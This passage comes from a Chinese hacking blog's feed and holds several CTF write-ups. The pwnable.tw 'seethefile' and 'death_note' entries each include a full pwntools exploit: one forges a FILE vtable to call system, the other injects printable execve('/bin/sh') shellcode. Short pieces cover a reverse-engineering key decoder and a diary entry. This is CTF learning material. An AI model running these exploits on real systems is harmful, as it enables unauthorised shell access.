class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line">/* Return the `struct tm&apos; representation of *T in local time.  */</span><br><span class="line">struct tm *</span><br><span class="line">localtime (const time_t *t)</span><br><span class="line">&#123;</span><br><span class="line">  return __tz_convert (t, 1, &amp;_tmbuf);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (localtime)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Return the `struct tm&apos; representation of *TIMER in the local timezone.</span><br><span class="line">   Use local time if USE_LOCALTIME is nonzero, UTC otherwise.  */</span><br><span class="line">struct tm *</span><br><span class="line">__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)</span><br><span class="line">&#123;</span><br><span class="line">  long int leap_correction;</span><br><span class="line">  int leap_extra_secs;</span><br><span class="line"></span><br><span class="line">  if (timer == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (tzset_lock);</span><br><span class="line"></span><br><span class="line">  /* Update internal database according to current TZ setting.</span><br><span class="line">     POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname.</span><br><span class="line">     This is a good idea since this allows at least a bit more parallelism.  */</span><br><span class="line">  tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1);</span><br><span class="line"></span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    __tzfile_compute (*timer, use_localtime, &amp;leap_correction,</span><br><span class="line">      &amp;leap_extra_secs, tp);</span><br><span class="line">      </span><br><span class="line">  &lt;--无关代码省略--&gt;</span><br><span class="line">  </span><br><span class="line">  return tp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* Interpret the TZ envariable.  */</span><br><span class="line">static void</span><br><span class="line">internal_function</span><br><span class="line">tzset_internal (int always, int explicit)</span><br><span class="line">&#123;</span><br><span class="line">  static int is_initialized;</span><br><span class="line">  const char *tz;</span><br><span class="line"></span><br><span class="line">  if (is_initialized &amp;&amp; !always)</span><br><span class="line">    return;</span><br><span class="line">  is_initialized = 1;</span><br><span class="line"></span><br><span class="line">  /* Examine the TZ environment variable.  */</span><br><span class="line">  tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值</span><br><span class="line">  if (tz == NULL &amp;&amp; !explicit)</span><br><span class="line">    /* Use the site-wide default.  This is a file name which means we</span><br><span class="line">       would not see changes to the file if we compare only the file</span><br><span class="line">       name for change.  We want to notice file changes if tzset() has</span><br><span class="line">       been called explicitly.  Leave TZ as NULL in this case.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC explicitly.  */</span><br><span class="line">    tz = &quot;Universal&quot;;</span><br><span class="line"></span><br><span class="line">  /* A leading colon means &quot;implementation defined syntax&quot;.</span><br><span class="line">     We ignore the colon and always use the same algorithm:</span><br><span class="line">     try a data file, and if none exists parse the 1003.1 syntax.  */</span><br><span class="line">  if (tz &amp;&amp; *tz == &apos;:&apos;)</span><br><span class="line">    ++tz;</span><br><span class="line"></span><br><span class="line">  /* Check whether the value changed since the last run.  */</span><br><span class="line">  if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0)</span><br><span class="line">    /* No change, simply return.  */</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  if (tz == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    tz = TZDEFAULT;</span><br><span class="line"></span><br><span class="line">  tz_rules[0].name = NULL;</span><br><span class="line">  tz_rules[1].name = NULL;</span><br><span class="line"></span><br><span class="line">  /* Save the value of `tz&apos;.  */</span><br><span class="line">  free (old_tz);</span><br><span class="line">  old_tz = tz ? __strdup (tz) : NULL;</span><br><span class="line"></span><br><span class="line">  /* Try to read a data file.  */</span><br><span class="line">  __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数</span><br><span class="line">  if (__use_tzfile)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">&lt;--无关代码省略--&gt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">__tzfile_read (const char *file, size_t extra, char **extrap)</span><br><span class="line">&#123;</span><br><span class="line">  static const char default_tzdir[] = TZDIR;</span><br><span class="line">  size_t num_isstd, num_isgmt;</span><br><span class="line">  FILE *f;</span><br><span class="line">  struct tzhead tzhead;</span><br><span class="line">  size_t chars;</span><br><span class="line">  size_t i;</span><br><span class="line">  size_t total_size;</span><br><span class="line">  size_t types_idx;</span><br><span class="line">  size_t leaps_idx;</span><br><span class="line">  int was_using_tzfile = __use_tzfile;</span><br><span class="line">  int trans_width = 4;</span><br><span class="line">  size_t tzspec_len;</span><br><span class="line">  char *new = NULL;</span><br><span class="line"></span><br><span class="line">  if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8)</span><br><span class="line">    abort ();</span><br><span class="line"></span><br><span class="line">  __use_tzfile = 0;</span><br><span class="line"></span><br><span class="line">  if (file == NULL)</span><br><span class="line">    /* No user specification; use the site-wide default.  */</span><br><span class="line">    file = TZDEFAULT;</span><br><span class="line">  else if (*file == &apos;\0&apos;)</span><br><span class="line">    /* User specified the empty string; use UTC with no leap seconds.  */</span><br><span class="line">    goto ret_free_transitions;</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* We must not allow to read an arbitrary file in a setuid</span><br><span class="line"> program.  So we fail for any file which is not in the</span><br><span class="line"> directory hierachy starting at TZDIR</span><br><span class="line"> and which is not the system wide default TZDEFAULT.  */</span><br><span class="line">      if (__libc_enable_secure</span><br><span class="line">  &amp;&amp; ((*file == &apos;/&apos;</span><br><span class="line">       &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT)</span><br><span class="line">       &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1))</span><br><span class="line">      || strstr (file, &quot;../&quot;) != NULL))</span><br><span class="line">/* This test is certainly a bit too restrictive but it should</span><br><span class="line">   catch all critical cases.  */</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  if (*file != &apos;/&apos;)</span><br><span class="line">    &#123;</span><br><span class="line">      const char *tzdir;</span><br><span class="line"></span><br><span class="line">      tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录</span><br><span class="line">      if (tzdir == NULL || *tzdir == &apos;\0&apos;)</span><br><span class="line">tzdir = default_tzdir;</span><br><span class="line">      if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1)</span><br><span class="line">goto ret_free_transitions;</span><br><span class="line">      file = new;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If we were already using tzfile, check whether the file changed.  */</span><br><span class="line">  struct stat64 st;</span><br><span class="line">  if (was_using_tzfile</span><br><span class="line">      &amp;&amp; stat64 (file, &amp;st) == 0</span><br><span class="line">      &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev</span><br><span class="line">      &amp;&amp; tzfile_mtime == st.st_mtime)</span><br><span class="line">    goto done;  /* Nothing to do.  */</span><br><span class="line"></span><br><span class="line">  /* Note the file is opened with cancellation in the I/O functions</span><br><span class="line">     disabled and if available FD_CLOEXEC set.  */</span><br><span class="line">  f = fopen (file, &quot;rce&quot;);//★打开文件</span><br></pre></td></tr></table></figure><p>最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？）</p><p>printf_chk 源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* Write formatted output to stdout from the format string FORMAT.  */</span><br><span class="line">int</span><br><span class="line">___printf_chk (int flag, const char *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  int done;</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock_clear_flags2 (stdout);</span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY;</span><br><span class="line"></span><br><span class="line">  va_start (ap, format);</span><br><span class="line">  done = vfprintf (stdout, format, ap);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY;</span><br><span class="line">  _IO_release_lock (stdout);</span><br><span class="line"></span><br><span class="line">  return done;</span><br><span class="line">&#125;</span><br><span class="line">ldbl_strong_alias (___printf_chk, __printf_chk)</span><br></pre></td></tr></table></figure><p>printf_chk 格式化字符串漏洞。。。神奇、、</p><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><p>第一次见FILE题，学习一下</p><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;---------------MENU---------------&quot;);</span><br><span class="line">  puts(&quot;  1. Open&quot;);</span><br><span class="line">  puts(&quot;  2. Read&quot;);</span><br><span class="line">  puts(&quot;  3. Write to screen&quot;);</span><br><span class="line">  puts(&quot;  4. Close&quot;);</span><br><span class="line">  puts(&quot;  5. Exit&quot;);</span><br><span class="line">  puts(&quot;----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。</p><h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p>后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。<br>我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。<br>至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。</p><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process(&apos;./seethefile&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10200)</span><br><span class="line">elf = ELF(&apos;./seethefile&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">def open(name):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;see :&apos;)</span><br><span class="line">sh.sendline(name)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def close():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def exit(con):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;Leave your name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">open(&apos;/proc/self/maps&apos;)</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">heap = int(sh.recvline()[:8],16)</span><br><span class="line">success(&apos;heap: &apos;+hex(heap))</span><br><span class="line">libc.address = int(sh.recvline()[:8],16)+0x1000</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">pay = &apos;\x00&apos;*32 + p32(0x0804B300)</span><br><span class="line">pay+=&apos;\x00&apos;*(0x80-4)</span><br><span class="line">file = &apos;\xff\xff\xff\xff;$0\x00&apos;.ljust(0x48,&apos;\x00&apos;)</span><br><span class="line">file = file.ljust(0x94,&apos;\x00&apos;)  //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0x228;</span><br><span class="line">pay+=file</span><br><span class="line">pay+=p32(0x0804B300+0x98)</span><br><span class="line">pay+=p32(system)*21#vtable</span><br><span class="line">exit(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="death-note"><a href="#death-note" class="headerlink" title="death_note"></a>death_note</h1><p><em>话说这边的题难度真是飘忽不定。。</em></p><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot;             DeathNote             &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot; 1. Add a name                     &quot;);</span><br><span class="line">  puts(&quot; 2. show a name on the note        &quot;);</span><br><span class="line">  puts(&quot; 3. delete a name int the note     &quot;);</span><br><span class="line">  puts(&quot; 4. Exit                           &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># checksec death_note</span><br><span class="line">[*] &apos;/root/pwnable/death_note1/death_note&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><p>题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。</p><p>输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。<br>shellcode可以使用metasploit自带的msfvenom来生成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./death_note&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10201)</span><br><span class="line"></span><br><span class="line">def add(idx,con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(&apos;Name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">pay = asm(&apos;&apos;&apos;</span><br><span class="line">/* execve(&apos;/bin///sh&apos;,0,0)*/</span><br><span class="line"></span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line"></span><br><span class="line">push esp</span><br><span class="line">pop ebx /*set ebx to &apos;/bin///sh&apos;*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">dec edx</span><br><span class="line">dec edx /*set dl to 0xfe*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor [eax+32],dl /*decode int 0x80*/</span><br><span class="line">xor [eax+33],dl /*decode int 0x80*/</span><br><span class="line"></span><br><span class="line">inc edx</span><br><span class="line">inc edx /*recover edx to 0*/</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">pop ecx /*set ecx to 0*/</span><br><span class="line"></span><br><span class="line">push 0x40</span><br><span class="line">pop eax</span><br><span class="line">xor al,0x4b /*set eax to 0xb*/</span><br><span class="line"></span><br><span class="line">/*int 0x80*/</span><br><span class="line">&apos;&apos;&apos;)+&apos;\x33\x7e&apos;</span><br><span class="line"></span><br><span class="line">add(-19,pay)</span><br><span class="line">dele(-19)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Jarvis Oj-reverse</title>
      <link href="/2018/11/06/jarvis-oj-reverse/"/>
      <url>/2018/11/06/jarvis-oj-reverse/</url>
      <content type="html"><![CDATA[<p><em>稍微学学逆向</em></p><h1 id="FindKey"><a href="#FindKey" class="headerlink" title="FindKey"></a>FindKey</h1><p>  拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题）<br>  将pyc还原成py文件<br>  发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序）<br>  直接上wp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">lookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] </span><br><span class="line">pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]</span><br><span class="line">pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]</span><br><span class="line"></span><br><span class="line">flag = &quot; &quot;</span><br><span class="line">for i in range (0,17):</span><br><span class="line">    flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )</span><br><span class="line"></span><br><span class="line">f = flag[::-1]</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure><ul><li>对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg</li></ul>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20181027</title>
      <link href="/2018/10/27/diary-20181027/"/>
      <url>/2018/10/27/diary-20181027/</url>
      <content type="html"><![CDATA[<p>  或许真的是极尽苦难的一周。<br>  也是一事无成的一周。<br>  少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。<br>  虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。<br>  再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。<br>  虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。<br>  所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。<br>  不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.2-fastbin_dup_consolidate</title>
      <link href="/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/"/>
      <url>/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/</url>
